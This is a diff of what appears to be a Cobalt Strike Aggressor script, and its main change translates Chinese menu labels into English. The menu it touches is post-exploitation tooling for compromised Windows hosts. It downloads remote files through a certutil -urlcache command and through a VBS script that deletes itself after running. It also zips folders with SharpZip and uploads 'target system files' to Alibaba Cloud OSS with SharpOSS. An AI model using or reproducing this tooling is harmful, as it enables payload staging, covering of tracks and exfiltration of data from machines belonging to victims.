@@ -1,11 +1,11 @@
-menu "辅助模块" {
-  item "certutil下载文件" {
+menu "Auxiliary module" {
+  item "certutil download file" {
     $bid = $1['@'];
-    $dialog = dialog("certutil远程下载", %(url => "http://xxxx", path => "C:\\Windows\\Temp\\helper.exe", bid => $bid), &certutil);
-    dialog_description($dialog, "certutil命令远程文件下载。");
-    drow_text($dialog, "url", "远程文件地址: ");
-    drow_text($dialog, "path", "本地储存文件: ");
-    dbutton_action($dialog, "运行");
+    $dialog = dialog("certutil remote download", %(url => "http://xxxx", path => "C:\\Windows\\Temp\\helper.exe", bid => $bid), &certutil);
+    dialog_description($dialog, "certutil command remote file download.");
+    drow_text($dialog, "url", "remote file address: ");
+    drow_text($dialog, "path", "store files locally: ");
+    dbutton_action($dialog, "run");
     dialog_show($dialog);
   }
   sub certutil {
@@ -14,13 +14,13 @@ menu "辅助模块" {
     bshell($bid, "certutil.exe -urlcache -split -f $url $path");
   }
 
-  item "vbs下载文件" {
+  item "vbs download file" {
     $bid = $1['@'];
-    $dialog = dialog("vbs下载文件", %(url => "http://xxxx", path => "C:\\Windows\\Temp\\helper.exe", bid => $bid), &vbs);
-    dialog_description($dialog, "vbs脚本远程下载文件，命令行传参，执行完毕自动清除vbs下载脚本。");
-    drow_text($dialog, "url", "远程文件地址: ");
-    drow_text($dialog, "path", "本地储存文件: ");
-    dbutton_action($dialog, "运行");
+    $dialog = dialog("vbs download file", %(url => "http://xxxx", path => "C:\\Windows\\Temp\\helper.exe", bid => $bid), &vbs);
+    dialog_description($dialog, "vbs script to download files remotely，command line parameter，Automatically clear vbs download script after execution.");
+    drow_text($dialog, "url", "remote file address: ");
+    drow_text($dialog, "path", "store files locally: ");
+    dbutton_action($dialog, "run");
     dialog_show($dialog);
   }
   sub vbs {
@@ -31,13 +31,13 @@ menu "辅助模块" {
     bshell($bid, "del /f /s /q download.vbs");
   }
 
-  item "SharpZip(压缩文件夹)" {
+  item "SharpZip(Compressed folder)" {
     $bid = $1['@'];
-    $dialog = dialog("SharpZip压缩打包文件", %(file => "C:\\Windows\\Temp", path => "C:\\Windows\\Temp.zip", bid => $bid), &SharpZip);
+    $dialog = dialog("SharpZip Compressed package file", %(file => "C:\\Windows\\Temp", path => "C:\\Windows\\Temp.zip", bid => $bid), &SharpZip);
     drow_text($dialog, "file", "file:  ");
     drow_text($dialog, "path", "path:  ");
-    dialog_description($dialog, "对目录或文件进行压缩打包。项目地址：https://github.com/uknowsec/SharpZip");
-    dbutton_action($dialog, "运行");
+    dialog_description($dialog, "Compress and package directories or files. Project address：https://github.com/uknowsec/SharpZip");
+    dbutton_action($dialog, "run");
     dialog_show($dialog);
   }
   sub SharpZip {
@@ -45,16 +45,16 @@ menu "辅助模块" {
     bexecute_assembly($bid, script_resource("/scripts/Auxiliary/SharpZip.exe"), $arg);
   }
 
-  item "SharpOSS(上传文件)" {
+  item "SharpOSS(Upload files)" {
     $bid = $1['@'];
     $dialog = dialog("SharpOSS", %(bucketName => "", accessKeyId => "", accessKeySecret => "", endpoint => "oss-cn-chengdu.aliyuncs.com", UploadFilePath => "C:\\Windows\\Temp\\bak.zip", bid => $bid), &SharpOSS);
-    dialog_description($dialog, "通过aliyun-oss-csharp-sdk快速上传目标系统文件到阿里云OSS。项目地址：https://github.com/uknowsec/SharpOSS");
+    dialog_description($dialog, "Use aliyun-oss-csharp-sdk to quickly upload target system files to Alibaba Cloud OSS. Project address：https://github.com/uknowsec/SharpOSS");
     drow_text($dialog, "bucketName", "BucketName: ");
     drow_text($dialog, "accessKeyId", "AccessKeyId: ");
     drow_text($dialog, "accessKeySecret", "AccessKeySecret: ");
     drow_text($dialog, "endpoint", "Endpoint: ");
     drow_text($dialog, "UploadFilePath", "UploadFilePath: ");
-    dbutton_action($dialog, "运行");
+    dbutton_action($dialog, "run");
     dialog_show($dialog);
   }
   sub SharpOSS {
